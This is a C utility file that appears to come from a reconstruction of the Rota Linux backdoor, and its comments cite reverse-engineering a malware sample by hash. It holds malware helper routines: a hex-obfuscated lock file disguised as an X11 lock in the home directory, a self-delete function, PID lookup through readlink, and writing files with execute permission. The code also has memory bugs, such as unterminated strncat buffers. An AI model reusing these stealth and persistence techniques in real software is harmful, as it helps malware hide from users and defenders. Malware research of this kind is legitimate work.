#include "utils.h"

#include <stdlib.h>
#include <strings.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <unistd.h>
#include <errno.h>

/**
 * Create a lock file to ensure one instance is running.
 * TODO - but how does this apply to the watch dog instances?
 * @param N/A
 * @return void
 * */
void create_lock() {

    // /.X11/X0-lock
    char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b,0xa};
    char *HOME = getenv("HOME");

    // $HOME/.X11/x0-lock
    int fpath_size = strlen(HOME) + strlen(x11_lock_file);
    char *flock_path = (char *)malloc(fpath_size);
    strncat(flock_path, HOME, strlen(HOME));
    strncat(flock_path, x11_lock_file, strlen(x11_lock_file));

    // create .X11 dir
    char *x11dir= "/.X11";
    int x11path_size = strlen(HOME) + strlen(x11dir);
    char *dirpath = (char *)malloc(x11path_size);
    strncat(dirpath, HOME, strlen(HOME));
    strncat(dirpath, x11dir, strlen(x11dir));
    if (access(dirpath, F_OK) == -1) {
        mkdir(dirpath, 0755);
    }

    // create directory of .X11 if it does not exist
    int fd = open(flock_path, O_CREAT);
    if (fd > 0) {
        flock(fd, LOCK_EX);
    }

    // lock file must already exist...
    close(fd);
}


/**
 * @brief delete file based on fpath
 * @param file path to delete
 * @return boolean value indicating success/failure
 **/
bool self_delete(char *fpath) {

        int res = unlink(fpath);
        if (res < 0){
            fprintf(stderr, "Error self-deleting: %s", strerror(errno));
            return false;
        }
        return true;
}


/**
 * obtain PID from shared mem instance
 *
 * @param size: size of data to copy into buffer
 * @param fpath file path to read in
 *
 * @return pointer to char buffer
 * */

char *copy_pid_from_shared_mem(uint size, char *fpath) {

    // the structure was copied from reveree engineering
    // function at offset 0x0040736f in sample 5c0f375e92f551e8f2321b141c15c48f
    char *tmpFileBuff = (char *)malloc(0x40);
    bzero(tmpFileBuff, 0x40);
    sprintf(tmpFileBuff, fpath, size);

    char *filePathBuff= (char *)malloc(0x1000);
    bzero(filePathBuff, 0x1000);
    int bytesRead = readlink(tmpFileBuff, filePathBuff, 0xfff);

    if (bytesRead != size) {
        free(tmpFileBuff);
        free(filePathBuff);
        return NULL;
    }

    free(tmpFileBuff);

    return filePathBuff;
}


// helper function to create *new* files.
bool write_to_file(char *fpath, char *data) {

    // TODO - double check file permissions from rota samples.
    int fd = open(fpath, O_CREAT | O_WRONLY, S_IRUSR|S_IEXEC);
    int numbyteswritten = write(fd, data, strlen(data));
    close(fd);

    // if number of bytes written == size of data, success!
    if (numbyteswritten == strlen(data)) {
        return true;
    } else {
        return false;
    }

    return false;
}
